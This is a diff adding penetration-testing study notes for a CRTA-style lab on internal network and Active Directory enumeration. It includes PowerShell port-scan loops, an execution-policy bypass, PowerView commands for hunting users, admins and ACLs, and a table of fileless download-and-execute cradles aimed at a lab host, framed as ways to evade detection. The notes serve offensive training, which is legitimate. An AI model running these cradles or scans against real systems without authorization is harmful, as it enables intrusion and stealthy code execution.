@@ -19,7 +19,220 @@
     # source -> https://www.sans.org/blog/sans-pen-test-cheat-sheet-powershell
    ```
 
+# Internal Network & Active Directory Enumeration (CRTA Prep)
 
+Internal network and Active Directory (AD) reconnaissance focuses on establishing situational awareness after gaining an initial foothold. Built-in Windows utilities and specialized PowerShell offensive toolsets allow operators to map services, accounts, trust boundaries, and administrative relationships across the domain.
+
+---
+
+## Native PowerShell Port Scanning & Host Discovery
+
+When third-party utilities (`nmap`, `netcat`, `masscan`) cannot be dropped onto disk due to endpoint monitoring or restrictions, native .NET classes via PowerShell enable basic TCP connect scanning.
+
+### 1. TCP Connect Port Sweep (Single Target)
+
+Using the .NET `[System.Net.Sockets.TcpClient]` class:
+
+```powershell
+# Scan TCP ports 1 to 1024 on a single target IP
+1..1024 | ForEach-Object {
+    $port = $_
+    $client = New-Object System.Net.Sockets.TcpClient
+    try {
+        $asyncResult = $client.BeginConnect("10.0.0.100", $port, $null, $null)
+        if ($asyncResult.AsyncWaitHandle.WaitOne(100, $false) -and $client.Connected) {
+            Write-Host "[+] Port $port is OPEN" -ForegroundColor Green
+            $client.EndConnect($asyncResult)
+        }
+    } catch {} finally {
+        $client.Close()
+    }
+}
+
+```
+
+### 2. Fast Built-in Check (`Test-NetConnection`)
+
+Available on Windows PowerShell 5.1+:
+
+```powershell
+# Test specific ports quietly (returns True/False)
+442..445 | ForEach-Object {
+    [PSCustomObject]@{
+        Port   = $_
+        IsOpen = (Test-NetConnection -ComputerName "10.0.0.100" -Port $_ -InformationLevel Quiet -WarningAction SilentlyContinue)
+    }
+}
+
+```
+
+### 3. Multi-Host Subnet Sweep
+
+```powershell
+# Sweep common infrastructure ports across an IP range
+$ports = 22, 53, 80, 88, 389, 445, 3389, 5985
+1..20 | ForEach-Object {
+    $ip = "10.10.10.$_"
+    Write-Host "--- Scanning $ip ---" -ForegroundColor Cyan
+    foreach ($p in $ports) {
+        $tcp = New-Object System.Net.Sockets.TcpClient
+        try {
+            $iar = $tcp.BeginConnect($ip, $p, $null, $null)
+            if ($iar.AsyncWaitHandle.WaitOne(100, $false) -and $tcp.Connected) {
+                Write-Host "  [+] Port $p is open on $ip" -ForegroundColor Green
+                $tcp.EndConnect($iar)
+            }
+        } catch {} finally {
+            $tcp.Close()
+        }
+    }
+}
+
+```
+
+---
+
+## Active Directory Essentials & Execution Context
+
+### Scope Architecture Reference
+
+* **`10.10.10.2`** — Domain Controller (`DC01`)
+* **`10.10.10.3`** — Application / Database Server (`APPSRV01`)
+* **`10.10.10.4`** — Initial Access / Workstation (`WS01`)
+
+### PowerShell Execution Policy & Loading
+
+PowerShell Execution Policy is a safety guardrail, **not a security boundary**. It does not restrict running code in memory.
+
+```cmd
+# Launch a PowerShell session with execution policy bypassed
+powershell.exe -ExecutionPolicy Bypass -NoLogo
+
+```
+
+#### Module Loading Mechanisms
+
+* **Dot-Sourcing:** Loads functions directly into the current scope/session memory without compiling a persistent module.
+```powershell
+. .\PowerView.ps1
+
+```
+
+
+* **Module Import:** Standard PowerShell module loading (requires `.psm1` or `.psd1` structure).
+```powershell
+Import-Module .\PowerView.psd1 -Force
+
+```
+
+
+
+---
+
+## In-Memory Download Cradles
+
+Download cradles retrieve scripts over the network and pipe them directly into `Invoke-Expression` (`IEX`) or `[ScriptBlock]::Create()`, avoiding writing files to disk (evading static signature detection on storage).
+
+### Common Cradle Variants
+
+| Method | Syntax | Technical Mechanics |
+| --- | --- | --- |
+| **`Net.WebClient`** | `IEX (New-Object Net.WebClient).DownloadString('[http://192.168.2.2/script.ps1](http://192.168.2.2/script.ps1)')` | Standard .NET web client; performs synchronous in-memory string retrieval. |
+| **`Invoke-WebRequest`** | `IEX (iwr '[http://192.168.2.2/script.ps1](http://192.168.2.2/script.ps1)' -UseBasicParsing).Content` | Modern PS built-in cmdlet; `-UseBasicParsing` prevents DOM engine initialization on servers. |
+| **`System.Net.WebRequest`** | `$req = [System.Net.WebRequest]::Create('[http://192.168.2.2/script.ps1](http://192.168.2.2/script.ps1)'); IEX (New-Object IO.StreamReader($req.GetResponse().GetResponseStream())).ReadToEnd()` | Low-level .NET Stream reader; evades basic string detections targeting standard cmdlet names. |
+| **`Msxml2.XMLHTTP` (COM)** | `$h = New-Object -ComObject Msxml2.ServerXMLHTTP.6.0; $h.open('GET', '[http://192.168.2.2/script.ps1](http://192.168.2.2/script.ps1)', $false); $h.send(); IEX $h.responseText` | Uses COM interface via unmanaged components to perform out-of-band HTTP retrieval. |
+
+---
+
+## Active Directory Enumeration with PowerView
+
+PowerView (developed by Will Schroeder / harmj0y) leverages ADSI (Active Directory Service Interfaces) and .NET directory searchers to query LDAP and Active Directory without requiring the official `ActiveDirectory` PowerShell module or RSAT tools.
+
+### 1. Domain & Forest Reconnaissance
+
+```powershell
+# Get details about the current domain (Forest root, Domain Mode, PDC)
+Get-NetDomain
+
+# Query a foreign/trusted domain specifically
+Get-NetDomain -Domain labs.corp
+
+# Get Domain Controller instances for the current domain
+Get-NetDomainController
+
+# Retrieve the Domain Security Identifier (SID)
+Get-DomainSID
+
+# Enumerate all domains within the active Active Directory Forest
+Get-NetForestDomain -Verbose
+Get-NetForest -Verbose
+
+```
+
+### 2. User & Identity Mapping
+
+```powershell
+# Native comparison (legacy Windows commands)
+net user /domain
+
+# Enumerate all domain users with PowerView
+Get-NetUser
+
+# Enumerate specific user details and attributes (e.g., description, logonCount, badPwdCount)
+Get-NetUser -UserName "emp1" | Select-Object samaccountname, description, memberof, pwdlastset
+
+# Filter users with custom attributes (e.g., finding service accounts with SPNs)
+Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
+
+```
+
+### 3. Computer & Asset Discovery
+
+```powershell
+# List all computer objects in the domain
+Get-NetComputer
+
+# Retrieve detailed operating system and service pack information
+Get-NetComputer -FullData | Select-Object name, operatingsystem, operatingsystemversion, dnshostname
+
+```
+
+### 4. Group & Membership Enumeration
+
+```powershell
+# Enumerate all Domain Groups
+Get-NetGroup
+
+# List members of high-value administrative groups
+Get-NetGroupMember -Identity "Domain Admins"
+Get-NetGroupMember -Identity "Enterprise Admins"
+
+# Enumerate users in nested groups
+Get-NetGroupMember -Identity "Administrators" -Recurse
+
+```
+
+### 5. High-Value Actionable Checks
+
+* **Local Administrator Hunting:** Scans reachable domain machines to identify where the current user context holds local administrative rights (queries the local `Remote Procedure Call (RPC)` / `OpenSCManagerW` interface).
+```powershell
+Find-LocalAdminAccess -Verbose
+
+```
+
+
+* **Active Session Enumeration:** Identifies where specific privileged users (e.g., Domain Admins) are logged on across domain systems (`NetSessionEnum` / `NetWkstaUserEnum` APIs).
+```powershell
+Get-NetSession -ComputerName DC01
+
+```
+
+
+* **Access Control List (ACL) Scanning:** Scans for discretionary access control lists (DACLs) granting dangerous permissions (`GenericAll`, `WriteDacl`, `WriteOwner`, `GenericWrite`) over domain objects.
+```powershell
+Invoke-ACLScanner -ResolveGUIDs -Verbose
+
+```
 
 ## AD Essentials 
     • In the local environment we have 3 machines setup in a domain environment. One can use Windows PowerShell, Windows native executable for the enumeration and exploitation purposes.
